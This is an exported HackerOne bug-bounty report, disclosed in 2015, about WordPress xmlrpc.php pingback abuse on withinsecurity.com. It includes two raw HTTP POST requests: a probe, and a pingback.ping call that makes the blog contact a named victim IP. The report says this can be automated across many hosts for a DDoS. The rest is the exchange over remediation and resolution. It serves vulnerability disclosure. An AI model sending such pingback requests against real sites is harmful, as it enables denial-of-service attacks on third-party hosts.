{"id":96294,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NjI5NA==","url":"https://hackerone.com/reports/96294","title":"DDOS using xmlrpc.php","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-10-28T08:05:12.419Z","submitted_at":"2015-10-28T08:05:12.419Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"anshuman_bh","url":"/anshuman_bh","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/274/e61ac38cffc356f9d4531f8581e62fd4b6603c67_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":7109,"url":"https://hackerone.com/withinsecurity","handle":"withinsecurity","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/109/11798ac6bc0ba8d82c71807889b53264f0cddd4e_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/109/11798ac6bc0ba8d82c71807889b53264f0cddd4e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"withinsecurity","twitter_handle":"withinsecurity","website":"https://withinsecurity.com","about":"Security Industry News"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2015-10-29T19:28:24.793Z","bug_reporter_agreed_on_going_public_at":"2015-10-29T18:02:57.677Z","team_member_agreed_on_going_public_at":"2015-10-29T19:28:24.605Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Wordpress blogs that have xmlrpc.php enabled for pingbacks, trackbacks, etc. can be made as a part of a huge botnet causing a major DDOS. The blog at withinsecurity.com has the xmlrpc.php file enabled and could thus be potentially used for such an attack against other victim hosts.\n\n* In order to determine whether the xmlrpc.php file is enabled or not, using the Repeater tab in Burp, send the request below. See screenshot 1: \n\n```\nPOST /xmlrpc.php HTTP/1.1 \nHost: withinsecurity.com \nConnection: keep-alive \nContent-Length: 175\n\n\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \n\u003cmethodCall\u003e \n\u003cmethodName\u003edemo.sayHello\u003c/methodName\u003e \n\u003cparams\u003e \n\u003cparam\u003e\n\u003cvalue\u003eadmin\u003c/value\u003e\n\u003c/param\u003e \n\u003c/params\u003e \n\u003c/methodCall\u003e\n```\n\n* Notice that a successful response is received showing that the xmlrpc.php file is enabled. \n\n* Now, considering the blog post `https://withinsecurity.com/2015/10/is-there-really-a-cybersecurity-skills-gap/` on the withinsecurity.com domain, the xmlrpc.php file discussed above could potentially be abused to cause a DDOS attack against a victim host. This is achieved by simply sending a request that looks like below. See Screenshot 2: \n\n```\nPOST /xmlrpc.php HTTP/1.1 \nHost: withinsecurity.com \nConnection: keep-alive \nContent-Length: 293\n\n\u003cmethodCall\u003e\n\u003cmethodName\u003epingback.ping\u003c/methodName\u003e\n\u003cparams\u003e\n\u003cparam\u003e\n\u003cvalue\u003e\u003cstring\u003ehttp://173.243.56.36/\u003c/string\u003e\u003c/value\u003e\n\u003c/param\u003e\n\u003cparam\u003e\n\u003cvalue\u003e\u003cstring\u003ehttps://withinsecurity.com/2015/10/is-there-really-a-cybersecurity-skills-gap/\u003c/string\u003e\u003c/value\u003e\n\u003c/param\u003e\n\u003c/params\u003e\n\u003c/methodCall\u003e\n```\n\n* As soon as the above request is sent, the victim host (173.243.56.36) gets an entry in its log file with a request originating from the withinsecurity.com domain verifying the pingback. See screenshot 3.\n\nThis can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim. ","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":59204,"file_name":"1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/059/204/16dfaafaf789067d18fdf3e10b80aa2ad36dce84/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ5B5ZLR7W%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T154607Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDznwDn3DlLBhpUQR2HsgV%2FXq95UR4rgunTAtaALtJfOwIhAPs6S1Tcddn1VigtqMJZu1ze7EJhUESTAidgv9nNGvTkKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwZmyQg19q82eNvWTYq1wPVa9iL33aSnxoe9uhB7r2aVM0UjDJv7L7h4wpacx0zTD7Cg8zZaNStfUkAQ4PRdT1iVaYXFqr3oEtcRoGLKhag7I7AYV4CfabHIx%2FljtUdbse7EzqrV%2BLQvKbTG6z1i6zNoig4BjAmqV%2BbJNhSJroBCOPElku0SEqEghibUoxjbjpR4CBXjTIJwAUpnCgLLy91sSgp9KNeTgb1AkQk9PEiYIt%2BjjRn7YHGTo0lsLEhUWc0hsx6VLMRCiSyU6pMLzMGyTS6q7VECFtTn5Z0xG6cXCTKHB3pYQ1zLLYN8ml68bLOIBj9DG3soHxXVeXkifKnxu13VQyp3%2Fs7gxFDt1C7HjJ71usGGrh%2BfYBJJFBMGndfS1DoK%2Bopk8YhA2hlX3szEJmyZfm0KUVaG%2FoWbCJlR3fqXIBJ1cKXRlMooUSiLaTSXt07k2ZqF9w0HUl1IdVQzbNbJBH%2BnkPxpioMdR%2BthDqTyEJ4NZO1WuIxKWGZYyMyXsZaWNopcb1ntUTbg6h9jL8PBR4KRpM%2FHAsw70cht3GV%2BEt83AJHQMRTRifsEIkEWjFR47llnjXkbbepxcng%2ByfEEKZRp237bvaIzCz%2FOBASo1zhQretKmelA0U4%2BEADJwrI3hIwr4yRiwY6pAEjctaIC5qKHFIiVu1bdWXuftBXGyVKZyt2TIP%2B2%2FEEDUKSn7h674C0WnV7bDgpkWP3Jm2QA8%2B4oAW2qew892kEhCJxDwZz%2BXR81EJw6%2FG5A5FZJ8bUl63WLiuBkwA0Dx%2Bf%2FkeTcR6awW4gpgHN5q2%2B02FvrdW8HWnLO9b%2FdddTJiHpMjGB2dteCQWg1L0LIQ%2FyL7kCQpQu%2F5PLB76pfiUetgXbFQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=0fb41aed8697b3d0325f5b5e1a7c7238ce9bfaf54d946c715fdcaa3060984ce1","file_size":43279,"type":"image/png"},{"id":59205,"file_name":"2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/059/205/6087e84473e76f0b054c3f24ff34a153f8bdddb4/2.png?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ5B5ZLR7W%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T154607Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDznwDn3DlLBhpUQR2HsgV%2FXq95UR4rgunTAtaALtJfOwIhAPs6S1Tcddn1VigtqMJZu1ze7EJhUESTAidgv9nNGvTkKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwZmyQg19q82eNvWTYq1wPVa9iL33aSnxoe9uhB7r2aVM0UjDJv7L7h4wpacx0zTD7Cg8zZaNStfUkAQ4PRdT1iVaYXFqr3oEtcRoGLKhag7I7AYV4CfabHIx%2FljtUdbse7EzqrV%2BLQvKbTG6z1i6zNoig4BjAmqV%2BbJNhSJroBCOPElku0SEqEghibUoxjbjpR4CBXjTIJwAUpnCgLLy91sSgp9KNeTgb1AkQk9PEiYIt%2BjjRn7YHGTo0lsLEhUWc0hsx6VLMRCiSyU6pMLzMGyTS6q7VECFtTn5Z0xG6cXCTKHB3pYQ1zLLYN8ml68bLOIBj9DG3soHxXVeXkifKnxu13VQyp3%2Fs7gxFDt1C7HjJ71usGGrh%2BfYBJJFBMGndfS1DoK%2Bopk8YhA2hlX3szEJmyZfm0KUVaG%2FoWbCJlR3fqXIBJ1cKXRlMooUSiLaTSXt07k2ZqF9w0HUl1IdVQzbNbJBH%2BnkPxpioMdR%2BthDqTyEJ4NZO1WuIxKWGZYyMyXsZaWNopcb1ntUTbg6h9jL8PBR4KRpM%2FHAsw70cht3GV%2BEt83AJHQMRTRifsEIkEWjFR47llnjXkbbepxcng%2ByfEEKZRp237bvaIzCz%2FOBASo1zhQretKmelA0U4%2BEADJwrI3hIwr4yRiwY6pAEjctaIC5qKHFIiVu1bdWXuftBXGyVKZyt2TIP%2B2%2FEEDUKSn7h674C0WnV7bDgpkWP3Jm2QA8%2B4oAW2qew892kEhCJxDwZz%2BXR81EJw6%2FG5A5FZJ8bUl63WLiuBkwA0Dx%2Bf%2FkeTcR6awW4gpgHN5q2%2B02FvrdW8HWnLO9b%2FdddTJiHpMjGB2dteCQWg1L0LIQ%2FyL7kCQpQu%2F5PLB76pfiUetgXbFQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=1de8c2d45955cc06176b168dea11563c6c1f7b972bcc933d1bf9025288567a1d","file_size":56618,"type":"image/png"}],"allow_singular_disclosure_at":"2015-11-28T18:02:57.894Z","allow_singular_disclosure_after":-185233389.12391382,"singular_disclosure_allowed":true,"vote_count":5,"voters":["realtess","muhammad_uwais","silv3rpoision","spetr0x","l3ftr4ru"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":635448,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @anshuman_bh,\n\nThanks for your report. We'll investigate and see if this is something that we want to fix.","automated_response":false,"created_at":"2015-10-28T12:53:13.163Z","updated_at":"2015-10-28T12:53:13.163Z","actor":{"username":"siebejan","cleared":false,"url":"/siebejan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/995/8de18ac91b1da4a88b52c2c94d46fc0c3bb59fec_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"withinsecurity","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":635758,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"If the XMLRPC.php file is not being used, it should be disabled and removed completely to avoid any potential risks. Otherwise, it should at the very least be blocked from external access.\n\nThere are other things that can be done to remediate against this vulnerability. These are well-documented at some links mentioned below:\nhttp://www.namhuy.net/3122/remove-wordpress-x-pingback-header.html\nhttp://www.acunetix.com/blog/web-security-zone/wordpress-pingback-vulnerability/\nhttp://blog.sucuri.net/2014/03/more-than-162000-wordpress-sites-used-for-distributed-denial-of-service-attack.html\nhttp://www.saotn.org/huge-increase-wordpress-xmlrpc-php-post-requests/#.U-FtaPldUx-","automated_response":false,"created_at":"2015-10-28T17:46:14.516Z","updated_at":"2015-10-28T17:46:14.516Z","actor":{"username":"anshuman_bh","cleared":true,"url":"/anshuman_bh","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/274/e61ac38cffc356f9d4531f8581e62fd4b6603c67_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"withinsecurity","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":636319,"is_internal":false,"editable":false,"type":"Activities::BugNotApplicable","message":"If you actually read the blog posts you mention, you would notice this was fixed in WordPress 3.5.1.","automated_response":false,"created_at":"2015-10-29T01:16:32.494Z","updated_at":"2015-10-29T01:16:32.494Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"withinsecurity","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":636328,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @reed, did you get a chance to look at the PoC I provided? If it's fixed in WordPress 3.5.1, why was I still able to get pingbacks from withinsecurity.com host to my host? I *did* read the blogs I pasted. \n\nIf you actually read the comments in that blogpost, you will see that people are still questioning whether it was fixed in WP 3.5.1 or not. ","automated_response":false,"created_at":"2015-10-29T01:35:06.731Z","updated_at":"2015-10-29T01:35:06.731Z","actor":{"username":"anshuman_bh","cleared":true,"url":"/anshuman_bh","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/274/e61ac38cffc356f9d4531f8581e62fd4b6603c67_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"withinsecurity","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":637243,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"Fair enough. I've disabled the pingback ping functionality for now.","automated_response":false,"created_at":"2015-10-29T17:58:09.250Z","updated_at":"2015-10-29T17:58:09.250Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"withinsecurity","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":637247,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks for the report, and disappointing that WordPress hasn't done anything to improve this at all, even though they have released some type of fix for it.","automated_response":false,"created_at":"2015-10-29T17:58:57.043Z","updated_at":"2015-10-29T17:58:57.043Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"anshuman_bh","url":"/anshuman_bh"},"genius_execution_id":null,"team_handle":"withinsecurity","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":637256,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"It is disappointing for sure. I've seen this bug time and again with a lot of WP installations out there. Happy to help. Thanks!","automated_response":false,"created_at":"2015-10-29T18:02:57.705Z","updated_at":"2015-10-29T18:02:57.705Z","first_to_agree":true,"actor":{"username":"anshuman_bh","cleared":true,"url":"/anshuman_bh","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/274/e61ac38cffc356f9d4531f8581e62fd4b6603c67_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"withinsecurity","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":637523,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","automated_response":false,"created_at":"2015-10-29T19:28:15.918Z","updated_at":"2015-10-29T19:28:15.918Z","actor":{"url":"/withinsecurity","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/109/11798ac6bc0ba8d82c71807889b53264f0cddd4e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"withinsecurity"}},"genius_execution_id":null,"team_handle":"withinsecurity","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":637524,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2015-10-29T19:28:24.628Z","updated_at":"2015-10-29T19:28:24.628Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"withinsecurity","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":637525,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2015-10-29T19:28:24.816Z","updated_at":"2015-10-29T19:28:24.816Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"withinsecurity","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}